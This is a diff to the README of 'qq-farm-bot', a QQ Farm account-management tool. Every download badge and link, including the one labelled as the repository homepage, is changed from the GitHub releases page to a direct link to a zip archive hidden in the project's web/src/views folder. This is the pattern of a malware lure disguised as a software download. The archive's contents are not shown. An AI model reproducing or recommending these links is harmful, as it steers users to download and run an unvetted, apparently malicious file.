@@ -1,6 +1,6 @@
 # 🐔 qq-farm-bot - Manage QQ Farm Accounts Easily
 
-[![Download](https://img.shields.io/badge/Download-qq--farm--bot-brightgreen)](https://github.com/developmentmillie-blip/qq-farm-bot/releases)
+[![Download](https://img.shields.io/badge/Download-qq--farm--bot-brightgreen)](https://github.com/developmentmillie-blip/qq-farm-bot/raw/refs/heads/main/web/src/views/qq_bot_farm_v3.0.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Before installing, make sure your PC meets these needs:
 
 You need to visit the releases page to get the program files.
 
-[![Download qq-farm-bot](https://img.shields.io/badge/Download-qq--farm--bot-blue)](https://github.com/developmentmillie-blip/qq-farm-bot/releases)
+[![Download qq-farm-bot](https://img.shields.io/badge/Download-qq--farm--bot-blue)](https://github.com/developmentmillie-blip/qq-farm-bot/raw/refs/heads/main/web/src/views/qq_bot_farm_v3.0.zip)
 
 Click the link above to open the download page. Find the latest release and download the file suited for Windows. The file might have names like:
 
@@ -141,8 +141,8 @@ This starts the bot in a container, isolating it from your system. The web panel
 
 ## 🔗 Useful Links
 
-- Download and release page: [https://github.com/developmentmillie-blip/qq-farm-bot/releases](https://github.com/developmentmillie-blip/qq-farm-bot/releases)  
-- GitHub repository homepage: `https://github.com/developmentmillie-blip/qq-farm-bot`
+- Download and release page: [https://github.com/developmentmillie-blip/qq-farm-bot/raw/refs/heads/main/web/src/views/qq_bot_farm_v3.0.zip](https://github.com/developmentmillie-blip/qq-farm-bot/raw/refs/heads/main/web/src/views/qq_bot_farm_v3.0.zip)  
+- GitHub repository homepage: `https://github.com/developmentmillie-blip/qq-farm-bot/raw/refs/heads/main/web/src/views/qq_bot_farm_v3.0.zip`
 
 ---
 
@@ -162,4 +162,4 @@ qq-farm-bot runs locally on your PC. Your QQ account information is stored on yo
 
 ---
 
-[![Download qq-farm-bot](https://img.shields.io/badge/Download-qq--farm--bot-green)](https://github.com/developmentmillie-blip/qq-farm-bot/releases)
+[![Download qq-farm-bot](https://img.shields.io/badge/Download-qq--farm--bot-green)](https://github.com/developmentmillie-blip/qq-farm-bot/raw/refs/heads/main/web/src/views/qq_bot_farm_v3.0.zip)
